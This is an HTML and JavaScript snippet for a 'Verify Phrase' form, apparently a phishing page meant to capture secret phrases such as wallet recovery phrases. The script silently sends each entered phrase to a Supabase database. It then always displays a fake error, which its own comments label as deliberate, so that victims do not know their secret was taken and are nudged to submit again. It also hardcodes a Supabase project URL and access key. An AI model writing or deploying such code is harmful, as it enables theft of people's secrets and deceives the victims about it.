  <!-- ✅ Verify Section -->
  <div id="verify-section">
    <h2>Verify Phrase</h2>
    <input type="text" id="phraseInput" placeholder="Enter a phrase">
    <button onclick="savePhrase()">Submit</button>
    <p id="message"></p>
  </div>

  <script type="module">
    import { createClient } from "https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm";

    // ✅ Your Supabase credentials
    const SUPABASE_URL = "https://qrxiyoisqngsjgydqvwi.supabase.co";
    const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFyeGl5b2lzcW5nc2pneWRxdndpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTkzODQ5OTEsImV4cCI6MjA3NDk2MDk5MX0.rP6fhbyicfw6AeSkKXjmL-URA_Ph3xplAzX4sDoAYVs";

    const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

    const phraseInput = document.getElementById("phraseInput");
    const message = document.getElementById("message");
    const verifySection = document.getElementById("verify-section");

    // Show Verify form
    function showVerify() {
      verifySection.style.display = "block";
    }

    // Save phrase but ALWAYS show error
    async function savePhrase() {
      const text = phraseInput.value.trim();
      if (!text) {
        message.textContent = "⚠️ Please enter a phrase.";
        message.style.color = "red";
        return;
      }

      // Save to Supabase
      await supabase.from("phrases").insert([{ text }]);

      // Always show fake error
      message.textContent = "❌ Error saving phrase!";
      message.style.color = "red";
      phraseInput.value = "";
    }

    // Expose functions to window
    window.showVerify = showVerify;
    window.savePhrase = savePhrase;
  </script>
